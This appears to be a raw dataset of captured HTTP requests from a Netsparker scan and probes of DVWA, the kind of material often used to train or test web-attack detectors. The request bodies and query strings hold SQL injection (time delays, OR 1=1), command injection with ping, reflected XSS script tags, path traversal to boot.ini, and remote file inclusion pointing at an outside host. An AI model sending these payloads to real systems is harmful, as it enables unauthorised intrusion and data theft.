name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=SET+%2fA+0xFFF9999-2+%26&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 369
Accept-Encoding: gzip, deflate

name=Smith&sex=1))+WAITFOR+DELAY+%270%3a0%3a25%27--&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 390
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=ping+-c+25+127.0.0.1+%26&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 381
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=-1+OR+17-7%3d10&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 507
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=(SELECT+CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)))&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 564
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=(length(CTXSYS.DRITHSX.SN(user%2c(select+chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(51)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97)+from+DUAL))))&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 470
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=%2527%2522--%253E%253C%252Fstyle%253E%253C%252FscRipt%253E%253CscRipt%253Enetsparker%25280x003CD5%2529%253C%252FscRipt%253E&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 393
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=%27%3bSELECT+pg_sleep(25)--&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 387
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=ping+-n+25+127.0.0.1&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 394
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=%27)%3bSELECT+pg_sleep(25)--&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 323
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=1+OR+X%3d%27ss&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 330
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%27+OR+%271%27%3d%271&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 335
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%22%26+ping+-n+25+127.0.0.1+%26&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 395
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=1+ns%3dnetsparker(0x003D03)+&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 576
Accept-Encoding: gzip, deflate

name=ns..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini........................................................................................................................................................&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 398
Accept-Encoding: gzip, deflate

name=http%3a%2f%2fr87.com%2fn%3f%00.asp&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 433
Accept-Encoding: gzip, deflate

name=php%3a%2f%2ffilter%2f%2fresource%3dhttp%3a%2f%2fr87.com%2fn%3f%00.asp&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 390
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=*%2fnetsparker(0x003D21)%3b%2f*&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/dvwa/images?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/dvwa/css/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache

"
"/dvwa?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/dvwa/css/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache

"
"/dvwa/images?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/index.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 0

"
"/login.php HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 85

username=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&password=abc123&Login=Login"
"/vulnerabilities/captcha/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/Directory_traversal/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/fi/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/hidden/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/upload/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/tmp/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/view_help.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/view_source.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/xss_r/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 414
Accept-Encoding: gzip, deflate

name=Smith&sex=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAzQ0FEKTwvc2NyaXB0Pg%3d%3d&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 370
Accept-Encoding: gzip, deflate

